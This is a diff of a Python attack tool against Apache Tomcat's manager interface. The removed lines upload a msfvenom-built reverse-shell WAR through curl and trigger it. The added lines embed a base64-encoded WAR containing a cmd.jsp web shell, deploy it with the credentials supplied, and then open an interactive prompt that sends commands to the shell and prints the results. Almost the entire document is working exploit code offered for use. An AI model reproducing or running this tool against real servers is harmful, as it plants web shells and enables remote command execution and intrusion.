@@ -1,72 +1,49 @@
-import os
+#!/usr/bin/env python3
+
 import requests
+from cmd import Cmd
+import string
 import sys
 import random
-import string
-import time
+from base64 import b64encode, b64decode
+import re
 
-class bcolors:
-    OKGREEN = '\033[92m'
-    OKBLUE = '\033[94m'
-    FAIL = '\033[91m'
-    LIGHTGREY='\033[37m'
-    ENDC = '\033[0m'
-    ORANGE='\033[33m'
+username = input("username >> ")
+password = input("password >> ")
+url = input("url >> ")
 
-banner = """ _                            _    __        ___    ____  
-| |_ ___  _ __ ___   ___ __ _| |_  \ \      / / \  |  _ \ 
-| __/ _ \| '_ ` _ \ / __/ _` | __|  \ \ /\ / / _ \ | |_) |
-| || (_) | | | | | | (_| (_| | |_    \ V  V / ___ \|  _ < 
- \__\___/|_| |_| |_|\___\__,_|\__|    \_/\_/_/   \_\_| \_\
-                                                          
-             _                 _           
- _   _ _ __ | | ___   __ _  __| | ___ _ __ 
-| | | | '_ \| |/ _ \ / _` |/ _` |/ _ \ '__|
-| |_| | |_) | | (_) | (_| | (_| |  __/ |   
- \__,_| .__/|_|\___/ \__,_|\__,_|\___|_|   
-      |_|                                  
+payload = "UEsDBBQACAAIAO5iUDoAAAAAAAAAAAAAAAAJAAQATUVUQS1JTkYv/soAAAMAUEsHCAAAAAACAAAAAAAAAFBLAwQUAAgACADuYlA6AAAAAAAAAAAAAAAAFAAAAE1FVEEtSU5GL01BTklGRVNULk1G803My0xLLS7RDUstKs7Mz7NSMNQz4OVyLkpNLElN0XWqBAmY6RnEGxooaASX5in4ZiYX5RdXFpek5hYreOYl62nycvFyAQBQSwcIpn5dFkcAAABHAAAAUEsDBAoAAAAAAG5iUDoAAAAAAAAAAAAAAAAIAAAAV0VCLUlORi9QSwMEFAAIAAgAdGJQOgAAAAAAAAAAAAAAAA8AAABXRUItSU5GL3dlYi54bWyFT7EOgjAU3PsVpDt9iE6k4uCqk4ubqeWpJbQlvEr5fJEQjBPbvbt7uTt5GGyT9NiR8W7PNyLjyaFkMuI9VW2bjKqjPX+F0BYAteqVoLcT2lsYJXAEdY7I2eQrBjKLN8Yo4lb47gl5lm3gej5d9AutSo2joJz+fpEpaCJPXqswVViJYis6zM1v+W0nBqo4W8blYsfHaYRd32D4odQpi+XRW6tcJeGPZbKmNn2YBkvQthLjJWGh2OL+wjm5ZB9QSwcIadKRAb0AAABVAQAAUEsDBBQACAAIAFliUDoAAAAAAAAAAAAAAAAHAAAAY21kLmpzcH2SXWvCMBSG7/srzgJCq6O939oyvzYdaovWgZeZPWpGk3ZpMjfG/vuSqkyESSA5yfvkzUlywtYDVHSLwHhVShWRN/pBfa1Y4bdvm5iVfpu0YidsObYfZdNJHPaSwSp2+iXnVOQ17JnawfMidcLHZD6F6TAbJYOIPA0zArPudBgR/rUpJSfQ7WfjZBYRYqzGs3SZQbZKja7wU53YNc8v5Vq/cmaAl+5kaaYLFA0S2OPMWElsEmQbcCW+a6yVv0WVUkk5KpRu4+nBTQRCF4UH306plV9JJlQhXHK8yB0Q6MA1gw6QsDePiXfvpLJcY11DBRHMtVCMo91yDF3Px09cX8vGeCRaVVotlETKoayNU2XJ82XXYGPxRzFxos5WLTSgip6DObN+AvdwobhMGNzETGwtJQ1mBt9o+YQJtGb7HSsQ3IN8fDW4fDYrGvYfix/TbMEEh88JmpIJg6Z+nF9QSwcI0lMwLF0BAAB3AgAAUEsBAhQAFAAIAAgA7mJQOgAAAAACAAAAAAAAAAkABAAAAAAAAAAAAAAAAAAAAE1FVEEtSU5GL/7KAABQSwECFAAUAAgACADuYlA6pn5dFkcAAABHAAAAFAAAAAAAAAAAAAAAAAA9AAAATUVUQS1JTkYvTUFOSUZFU1QuTUZQSwECCgAKAAAAAABuYlA6AAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAADGAAAAV0VCLUlORi9QSwECFAAUAAgACAB0YlA6adKRAb0AAABVAQAADwAAAAAAAAAAAAAAAADsAAAAV0VCLUlORi93ZWIueG1sUEsBAhQAFAAIAAgAWWJQOtJTMCxdAQAAdwIAAAcAAAAAAAAAAAAAAAAA5gEAAGNtZC5qc3BQSwUGAAAAAAUABQAlAQAAeAMAAAAA"
 
-"""
-print
-print (bcolors.LIGHTGREY + banner + bcolors.ENDC)
-print
-print (bcolors.ORANGE + "For the exploit to work make sure you have curl instaled on you system using the command below\nSudo apt-get install curl"+ bcolors.ENDC)
-print
-print (bcolors.ORANGE + "To generate a WAR file use the command below\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war"+ bcolors.ENDC)
-print
-output_string = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(10))
-sess = requests.session()
-IPAddress = raw_input(bcolors.OKBLUE + "Please enter the Tomcat Server IPAddress or the Hostname ===> ")
-username = raw_input("Please enter the Tomcat Username ===> ")
-password = raw_input("Please enter the Tomcat Password ===> ")
-directory = raw_input("Please enter the exact directory/folder where the WAR file is located ===> ")
-fname = raw_input("Please enter FileName of the WAR file ===> ")
-WAR_FILE =  os.path.join(directory, fname)
+class Terminal(Cmd):
+    prompt = "cmd >> "
+    def default(self, args):
+        run_commands(args)
+def run_commands(cmd):
+    global file_name, url
+    data = {"cmd" : cmd}
+    out = requests.post(f"{url}/{file_name}.war/cmd.jsp", data=data)
+    try:
+        filtered = re.search("\x42\x52\x3e\x0a(.*?)\x0a\x3c\x2f\x70", out.text, re.DOTALL).group(1)
+        print(filtered)
+    except:
+        pass
+        print(out.text)
 
-
-
-url = "http://" + username + ":" + password + "@" + IPAddress + ":8080/manager/text/list"
-authenthication = sess.get(url).text
-
-if "401 Unauthorized" in authenthication:
-    print (bcolors.FAIL + "[-] You credentials seems invalid can you please verify" + bcolors.ENDC)
-    sys.exit(1)
-else:
-    print
-    print (bcolors.OKGREEN + "[+] Correct credentials provided" + bcolors.ENDC)
-    print
-    upload = os.system("curl  --upload-file " + WAR_FILE + " http://" + username + ":" +"'"+ password +"'" + "@" + IPAddress + ":8080/manager/text/deploy?path=/" + output_string)
-    print (upload)
-    verify = "http://" + username + ":" + password  + "@" + IPAddress + ":8080/manager/text/list"
-    print
-    ver = sess.get(verify).text
-    print
-    if output_string in ver:
-        print (bcolors.OKGREEN + "[+] Congratulation You have uploaded a shell successfully" + bcolors.ENDC)
-        time.sleep(2)
-        print (bcolors.OKGREEN + "[+] Executing the WAR File" + bcolors.ENDC)
-        print (bcolors.OKGREEN + "[+] You should be getting a shell now........." + bcolors.ENDC)
-        execute = "http://" + IPAddress + ":8080/"+ output_string
-        sess.get(execute).text
+def uploader():
+    global username, password, url, payload, file_name
+    file_name = "".join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(10))
+    sess = requests.session()
+    creds = b64encode(f"{username}:{password}".encode())
+    auth = {"Authorization" : f"Basic {creds.decode()}"}
+    proxy = {"http" : "http://127.0.0.1:8080"}
+    confirm = sess.put(f"{url}/manager/text/deploy?path=/{file_name}.war", data=b64decode(payload), headers=auth)
+    if "OK" in confirm.text:
+        print("[+] War Shell uploaded successfully")
+        print(confirm.text)
     else:
-        print (bcolors.FAIL + "[-] Sorry but it seems your shell was not uploaded can you retry" + bcolors.ENDC)
+        print("[-] Am not sure if the War Shell was uploaded fine\n[*] Continuing anyway")
+
+if __name__ == ("__main__"):
+    uploader()
+    terminal = Terminal()
+    terminal.cmdloop()
